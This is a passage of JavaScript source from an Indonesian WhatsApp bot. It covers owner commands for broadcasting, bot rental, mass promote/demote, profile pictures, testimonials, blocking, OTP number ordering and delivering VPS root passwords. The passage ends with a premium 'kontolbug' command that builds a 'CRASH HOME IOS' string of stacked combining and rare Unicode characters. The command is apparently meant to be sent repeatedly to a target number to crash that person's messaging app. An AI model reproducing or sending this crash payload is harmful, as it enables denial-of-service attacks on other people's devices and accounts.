let tujuan = `${txt}`
if (!m.quoted) {
DitzzXploit.sendText(mention, tujuan)
} else {
DitzzXploit.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await DitzzXploit.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `Mengirim Pesan *${mime ? mime : 'Teks'}*
*_Success ✅_*

Text :
${txt}
`
DitzzXploit.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: m })

}
break
             case 'listonline': case 'liston': {
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    DitzzXploit.sendText(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
  
   
                break
  case 'randomcecan1':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar Tuan Sedang Kami Proses⏳_`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_27832zh400.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://g.top4top.io/m_2783uxoa40.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await DitzzXploit.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
break
case 'sewabot':
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await DitzzXploit.groupCreate(args.join(" "), [])
let response = await DitzzXploit.groupInviteCode(cret.id)
DitzzXploit.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${namaCreator}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
case 'buysewa':
reply(`¥ *Price Sewa Bot Zans Official* €

🔏 3 hari = 15k
🔏 1 minggu = 25k
🔏 2 minggu = 35k
🔏 1 bulan = 50k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break
case'promoteall':
if (!isOwner) return reply('*Khusus Rafathar Offcial Doang Woii!!*')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.groupParticipantsUpdate(from, mems, 'promote')
break
case'demoteall':
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await DitzzXploit.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DitzzXploit.groupParticipantsUpdate(from, mems, 'demote')
break
	case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!quoted) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var medis = await DitzzXploit.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await DitzzXploit.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await DitzzXploit.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'setppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await DitzzXploit.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await DitzzXploit.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await DitzzXploit.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
    await DitzzXploit.removeProfilePicture(from)
    }
    break
case 'donasi':{
let tekssss = `MAU DONASI BANG ?😁
SILAHKAN PILIH PAYMENT DI BAWAH
DANA : PM OWMER
OVO : PM OWNER
QRIS : KETIK .qris
ORKUT : KETIK .orkut
BRI : KETIK .bri
PULSA1 : 085691304150
PULSA2 : 085811390863
GRUP :
${grup}
YTB : 
${youtube}
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/donasi.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2022`},
{quoted: fkontak})
}
break
case 'testi1':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 1)
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_1.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi2':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 2)
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_2.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi3':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 3)
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_3.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi4':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 4)
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_4.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi5':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 5)
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_5.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi6':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 6)
`
DitzzXploit.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_6.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'block':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await DitzzXploit.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Yatim Jebeh Tuan✅')
}
break
case 'unblock':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await DitzzXploit.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
reply('Sukses Unblock Yatim Jebeh Krna Terpaksa Tuan✅')
}
break
case 'profile':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-profile/${apikeyotp}`)
if (kode.succes == false) return reply(kode.data.messages)
let res = kode.data.data
let teks =`*GET PROFILE*
- Username: ${res.username}
- Saldo: Rp${toRupiah(cekSaldo(sender, db_saldo))}
- Saldo Usr: ${res.saldo}
- Email: ${res.email}`
reply(teks)
}
break
case 'layanan':{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-services/${apikeyotp}`)
if (kode.succes == false) return reply2(kode.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.order id_layanan\n\n*Contoh:* .order 14\n\n*List Layanan Kode Otp*\n\n'
let GG = 0
for (let x of kode.data.data){
teks +=`- ID layanan: ${x.id}\n- Name: ${x.name}\n- Harga: Rp${toRupiah(x.price)}\n\n`
}
reply(teks)
}
break
case "order":{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
if (!q) return reply(teks_format)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}

• info selengkapnya
silahkan ketik .getorder`)
}
break
case "getorder":{
if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
if (!q) return reply(teks_format2)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}`)
}
break
case 'svps': case 'sendvps': {
		 if (!isOwner) return reply(`Ngapain ? Khusus Pedia Official Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
DitzzXploit.sendMessage(mq1, {text:`*───❖》Pedia Official《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*\n\n\n\n*© Rafathar Offcial*`}, m) 
                 }
                 break
case "kontolbug":{
  if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
  let bugss = `📱 𝐂𝐑𝐀𝐒𝐇 𝐇𝐎𝐌𝐄 𝐈𝐎𝐒 🍏ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁